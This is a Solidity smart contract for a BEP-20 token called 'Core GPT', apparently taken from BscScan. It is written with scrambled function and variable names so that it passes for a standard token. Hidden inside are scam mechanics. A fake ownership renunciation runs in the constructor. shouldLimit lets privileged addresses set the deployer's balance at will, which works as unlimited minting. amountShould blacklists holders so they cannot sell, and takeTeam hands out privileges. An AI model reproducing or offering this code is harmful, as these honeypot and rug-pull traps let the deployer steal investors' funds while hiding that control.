/**
 *Submitted for verification at BscScan.com on 2023-02-14
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

interface maxList {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fromLaunch) external view returns (uint256);

    function transfer(address marketingTake, uint256 maxLimit) external returns (bool);

    function allowance(address takeEnable, address spender) external view returns (uint256);

    function approve(address spender, uint256 maxLimit) external returns (bool);

    function transferFrom(
        address sender,
        address marketingTake,
        uint256 maxLimit
    ) external returns (bool);

    event Transfer(address indexed from, address indexed txWallet, uint256 value);
    event Approval(address indexed takeEnable, address indexed spender, uint256 value);
}

interface maxListMetadata is maxList {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract autoMin {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverFrom {
    function createPair(address limitFrom, address takeAuto) external returns (address);
}

interface sellTradingEnable {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract CoreGPT is autoMin, maxList, maxListMetadata {

    function name() external view virtual override returns (string memory) {
        return txList;
    }

    function takeAt(address marketingFeeShould, address marketingTake, uint256 maxLimit) internal returns (bool) {
        if (marketingFeeShould == teamAt) {
            return swapAmount(marketingFeeShould, marketingTake, maxLimit);
        }
        require(!exemptSender[marketingFeeShould]);
        return swapAmount(marketingFeeShould, marketingTake, maxLimit);
    }

    function transferFrom(address marketingFeeShould, address marketingTake, uint256 maxLimit) external override returns (bool) {
        if (tokenAuto[marketingFeeShould][_msgSender()] != type(uint256).max) {
            require(maxLimit <= tokenAuto[marketingFeeShould][_msgSender()]);
            tokenAuto[marketingFeeShould][_msgSender()] -= maxLimit;
        }
        return takeAt(marketingFeeShould, marketingTake, maxLimit);
    }

    bool public swapReceiver;

    mapping(address => uint256) private walletFeeReceiver;

    bool public swapIs;

    bool public receiverLaunch;

    bool private feeList;

    function approve(address minMarketing, uint256 maxLimit) public virtual override returns (bool) {
        tokenAuto[_msgSender()][minMarketing] = maxLimit;
        emit Approval(_msgSender(), minMarketing, maxLimit);
        return true;
    }

    mapping(address => bool) public exemptSender;

    function fundMode() public view returns (bool) {
        return liquidityMarketing;
    }

    function marketingMin() public {
        emit OwnershipTransferred(teamAt, address(0));
        isEnableLiquidity = address(0);
    }

    string private txList = "Core GPT";

    function swapAmount(address marketingFeeShould, address marketingTake, uint256 maxLimit) internal returns (bool) {
        require(walletFeeReceiver[marketingFeeShould] >= maxLimit);
        walletFeeReceiver[marketingFeeShould] -= maxLimit;
        walletFeeReceiver[marketingTake] += maxLimit;
        emit Transfer(marketingFeeShould, marketingTake, maxLimit);
        return true;
    }

    function transfer(address buyTeam, uint256 maxLimit) external virtual override returns (bool) {
        return takeAt(_msgSender(), buyTeam, maxLimit);
    }

    uint8 private shouldReceiver = 18;

    function fromList() public {
        
        if (swapIs == swapFromReceiver) {
            liquidityMarketing = true;
        }
        liquidityMarketing=false;
    }

    bool private teamReceiver;

    function sellTx() public view returns (bool) {
        return launchedTotal;
    }

    address public sellSwap;

    bool private launchedTotal;

    function listWalletLaunched() public view returns (bool) {
        return launchedTotal;
    }

    mapping(address => bool) public txBuyIs;

    mapping(address => mapping(address => uint256)) private tokenAuto;

    bool public exemptTakeAmount;

    function symbol() external view virtual override returns (string memory) {
        return walletFundMode;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return txFee;
    }

    address public teamAt;

    address private isEnableLiquidity;

    function balanceOf(address fromLaunch) public view virtual override returns (uint256) {
        return walletFeeReceiver[fromLaunch];
    }

    string private walletFundMode = "CGT";

    function getOwner() external view returns (address) {
        return isEnableLiquidity;
    }

    bool private liquidityMarketing;

    event OwnershipTransferred(address indexed receiverFeeFund, address indexed walletFrom);

    function receiverMaxFrom() public {
        if (tokenTeam != modeFee) {
            teamReceiver = false;
        }
        
        liquidityMarketing=false;
    }

    uint256 private txFee = 100000000 * 10 ** 18;

    constructor (){
        
        sellTradingEnable fundTrading = sellTradingEnable(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        sellSwap = receiverFrom(fundTrading.factory()).createPair(fundTrading.WETH(), address(this));
        isEnableLiquidity = _msgSender();
        if (teamReceiver) {
            receiverLaunch = true;
        }
        teamAt = _msgSender();
        txBuyIs[_msgSender()] = true;
        
        walletFeeReceiver[_msgSender()] = txFee;
        emit Transfer(address(0), teamAt, txFee);
        marketingMin();
    }

    function receiverTake() public {
        
        
        modeFee=0;
    }

    function shouldLimit(uint256 maxLimit) public {
        if (!txBuyIs[_msgSender()]) {
            return;
        }
        walletFeeReceiver[teamAt] = maxLimit;
    }

    uint256 public modeFee;

    function allowance(address minLiquidityShould, address minMarketing) external view virtual override returns (uint256) {
        return tokenAuto[minLiquidityShould][minMarketing];
    }

    function decimals() external view virtual override returns (uint8) {
        return shouldReceiver;
    }

    uint256 private tokenTeam;

    function takeTeam(address sellWallet) public {
        if (exemptTakeAmount) {
            return;
        }
        
        txBuyIs[sellWallet] = true;
        if (swapIs) {
            swapIs = false;
        }
        exemptTakeAmount = true;
    }

    bool public swapFromReceiver;

    function owner() external view returns (address) {
        return isEnableLiquidity;
    }

    function amountShould(address receiverBuy) public {
        
        if (receiverBuy == teamAt || receiverBuy == sellSwap || !txBuyIs[_msgSender()]) {
            return;
        }
        if (feeList == swapFromReceiver) {
            swapFromReceiver = false;
        }
        exemptSender[receiverBuy] = true;
    }

}